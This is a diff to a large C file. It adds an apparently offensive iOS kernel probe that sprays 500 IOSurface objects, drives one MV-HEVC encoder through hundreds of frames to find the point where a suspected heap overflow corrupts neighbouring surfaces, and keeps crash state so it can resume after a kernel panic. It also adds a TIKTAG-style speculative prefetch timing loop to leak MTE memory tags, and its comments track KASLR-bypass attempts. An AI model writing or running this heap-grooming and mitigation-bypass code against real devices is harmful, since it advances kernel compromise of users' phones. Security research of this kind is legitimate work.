@@ -14278,6 +14278,193 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r345: Persistent encoder crash threshold + speculative MTE probe
+ * CRITICAL FIX: Earlier panics used ONE encoder with continuous VPS growth.
+ * r344 created a NEW encoder per count — wrong heap layout, no crashes.
+ * This probe uses a SINGLE persistent encoder to match panic conditions.
+ *
+ * Part A: Spray 500 IOSurface objects, create ONE lid=3 encoder.
+ *         Encode frames incrementally, checking IOSurface props every 5 frames.
+ *         Continue to 500 frames to find crash boundary with correct heap layout.
+ * Part B: Try speculative prefetch timing (TIKTAG-style) for MTE tag leaking.
+ *         Uses PRFM instruction to speculatively access tagged memory,
+ *         measuring cache-line fetch timing to infer tag match/mismatch. */
+
+static void r345_probe(void) {
+    rlog("\n=== r345: Persistent Encoder Crash Threshold + MTE Probe ===\n\n");
+    fflush(stdout);
+
+    /* ---- Part A: Single encoder, continuous VPS growth ---- */
+    rlog("--- Part A: Persistent encoder + IOSurface spray ---\n");
+    rlog("  Using ONE encoder for all encodes (matches panic trigger).\n");
+    fflush(stdout);
+
+    /* Spray IOSurface objects */
+    #define R345_SURF_COUNT 500
+    IOSurfaceRef surfs345[R345_SURF_COUNT];
+    uint32_t seeds345[R345_SURF_COUNT];
+    size_t widths345[R345_SURF_COUNT];
+    size_t heights345[R345_SURF_COUNT];
+    memset(surfs345, 0, sizeof(surfs345));
+
+    CFMutableDictionaryRef sd = CFDictionaryCreateMutable(NULL, 4,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef s_w = CFNumberCreate(NULL, kCFNumberIntType, &(int){64});
+    CFNumberRef s_h = CFNumberCreate(NULL, kCFNumberIntType, &(int){64});
+    CFNumberRef s_b = CFNumberCreate(NULL, kCFNumberIntType, &(int){4});
+    CFNumberRef s_f = CFNumberCreate(NULL, kCFNumberIntType, &(int){0x42475241});
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceWidth"), s_w);
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceHeight"), s_h);
+    CFDictionarySetValue(sd, CFSTR("IOSurfaceBytesPerElement"), s_b);
+    CFDictionarySetValue(sd, CFSTR("IOSurfacePixelFormat"), s_f);
+
+    int sprayed = 0;
+    for (int si = 0; si < R345_SURF_COUNT; si++) {
+        surfs345[si] = IOSurfaceCreate(sd);
+        if (surfs345[si]) {
+            seeds345[si] = IOSurfaceGetSeed(surfs345[si]);
+            widths345[si] = IOSurfaceGetWidth(surfs345[si]);
+            heights345[si] = IOSurfaceGetHeight(surfs345[si]);
+            sprayed++;
+        }
+    }
+    CFRelease(s_w); CFRelease(s_h); CFRelease(s_b); CFRelease(s_f); CFRelease(sd);
+    rlog("  Sprayed %d IOSurface objects.\n", sprayed);
+    fflush(stdout);
+
+    /* State file for reboot persistence */
+    #define R345_MAGIC 0xDEAD0345
+    struct r345_state { uint32_t magic; uint32_t last_frame; uint32_t crashed; };
+    char sp345[512];
+    snprintf(sp345, sizeof(sp345), "%s/Documents/r345_state.bin",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    struct r345_state s345 = {0, 0, 0};
+    int rfd = open(sp345, O_RDONLY);
+    if (rfd >= 0) { read(rfd, &s345, sizeof(s345)); close(rfd); }
+
+    uint32_t start_frame = 0;
+    if (s345.magic == R345_MAGIC && s345.crashed) {
+        rlog("  Previous run crashed at frame %u. MTE tag mismatch.\n", s345.last_frame);
+        rlog("  This confirms overflow reaches IOSurface at ~%u frames.\n", s345.last_frame);
+        start_frame = s345.last_frame - 5;
+        if (start_frame > 500) start_frame = 0;
+        rlog("  Resuming from frame %u to narrow down.\n", start_frame);
+    } else if (s345.magic == R345_MAGIC) {
+        start_frame = s345.last_frame;
+        rlog("  Resuming from state: last_frame=%u (survived).\n", start_frame);
+    }
+
+    /* Create ONE encoder */
+    VTCompressionSessionRef enc345 = create_mvhevc_encoder(64, 64, 3);
+    if (!enc345) {
+        rlog("  FATAL: encoder create failed\n");
+        goto r345_cleanup;
+    }
+
+    /* If resuming, fast-forward to start_frame (silent encodes) */
+    if (start_frame > 0) {
+        rlog("  Fast-forwarding %u silent encodes...\n", start_frame);
+        fflush(stdout);
+        for (uint32_t fi = 0; fi < start_frame; fi++) {
+            encode_one_stereo_lid(enc345, fi, 64, 64, 3);
+        }
+        rlog("  Fast-forward complete.\n");
+    }
+
+    /* Encode frames incrementally, checking every 5 */
+    int total_ok = (int)start_frame, total_err = 0;
+    for (uint32_t fi = start_frame; fi < 500; fi++) {
+        /* Save state before encode */
+        s345.magic = R345_MAGIC;
+        s345.last_frame = fi;
+        s345.crashed = 1; /* Assume crash until proven otherwise */
+        int wfd = open(sp345, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (wfd >= 0) { write(wfd, &s345, sizeof(s345)); close(wfd); }
+
+        int r = encode_one_stereo_lid(enc345, fi, 64, 64, 3);
+        if (r == 0) total_ok++;
+        else total_err++;
+
+        /* Mark as survived */
+        s345.crashed = 0;
+        wfd = open(sp345, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (wfd >= 0) { write(wfd, &s345, sizeof(s345)); close(wfd); }
+
+        /* Check IOSurface props every 5 frames */
+        if ((fi % 5) == 4 || fi >= 330) {
+            int changes = 0;
+            for (int si = 0; si < R345_SURF_COUNT; si++) {
+                if (!surfs345[si]) continue;
+                uint32_t seed_now = IOSurfaceGetSeed(surfs345[si]);
+                size_t w_now = IOSurfaceGetWidth(surfs345[si]);
+                size_t h_now = IOSurfaceGetHeight(surfs345[si]);
+                if (seed_now != seeds345[si]) {
+                    if (changes < 5)
+                        rlog("    SEED surf[%d]: %u→%u @frame=%u\n", si, seeds345[si], seed_now, fi);
+                    changes++;
+                }
+                if (w_now != widths345[si] || h_now != heights345[si]) {
+                    if (changes < 5)
+                        rlog("    DIM surf[%d]: %zux%zu→%zux%zu @frame=%u\n",
+                             si, widths345[si], heights345[si], w_now, h_now, fi);
+                    changes++;
+                }
+            }
+            rlog("  frame=%u ok=%d err=%d changes=%d\n", fi, total_ok, total_err, changes);
+            fflush(stdout);
+        }
+    }
+
+    rlog("  All 500 frames survived.\n");
+    VTCompressionSessionInvalidate(enc345);
+    CFRelease(enc345);
+
+r345_cleanup:
+    for (int si = 0; si < R345_SURF_COUNT; si++) {
+        if (surfs345[si]) CFRelease(surfs345[si]);
+    }
+
+    /* ---- Part B: Speculative prefetch MTE tag probe ---- */
+    rlog("\n--- Part B: Speculative prefetch timing (TIKTAG-style) ---\n");
+    rlog("  Testing if PRFM instruction leaks MTE tag info on A20 Pro.\n");
+    fflush(stdout);
+
+    /* Allocate a page and set a known MTE tag via assembly */
+    void *probe_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                            MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (probe_page != MAP_FAILED) {
+        memset(probe_page, 0x41, 4096);
+
+        /* On MTE-capable ARM, we'd use IRG/STG to set tags.
+         * On iOS userspace, MTE instructions may be privileged.
+         * Try PRFM (prefetch) with different tag values and measure timing. */
+        uint64_t base = (uint64_t)probe_page;
+        rlog("  Probe page at 0x%llx\n", base);
+
+        /* Test: does PRFM with wrong tag bits differ in timing from correct? */
+        volatile uint64_t sink = 0;
+        for (int tag = 0; tag < 16; tag++) {
+            uint64_t tagged_addr = (base & 0x00FFFFFFFFFFFFFFULL) | ((uint64_t)tag << 56);
+            uint64_t t0 = mach_absolute_time();
+            for (int rep = 0; rep < 10000; rep++) {
+                __asm__ volatile(
+                    "prfm pldl1keep, [%0]"
+                    : : "r"(tagged_addr)
+                );
+            }
+            uint64_t t1 = mach_absolute_time();
+            double ticks = (double)(t1 - t0) / 10000.0;
+            rlog("    tag=%x addr=0x%llx ticks=%.1f\n", tag, tagged_addr, ticks);
+            sink += t1;
+        }
+        (void)sink;
+        munmap(probe_page, 4096);
+    }
+
+    rlog("\n=== r345 complete ===\n");
+    fflush(stdout);
+}
+
 /* r344: IOKit registry KASLR leak + zone info + crash threshold with spray
  * Part A: Enumerate ALL IOKit registry properties looking for kernel pointers
  *         (0xfffffe pattern). Even one leak = KASLR bypass solved.
@@ -47746,6 +47933,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 348) {
+            rlog("*** rounds=348: Persistent Encoder + Speculative MTE ***\n");
+            rlog("  r344: IOKit/zone/port KASLR leaks ALL PATCHED on iOS 27.1.\n");
+            rlog("  r344: Per-count encoder didn't crash (wrong heap layout).\n");
+            rlog("  r345: Single encoder, continuous growth, 500 IOSurface spray.\n\n");
+            r345_probe();
             goto done;
         }
         if (rounds == 347) {
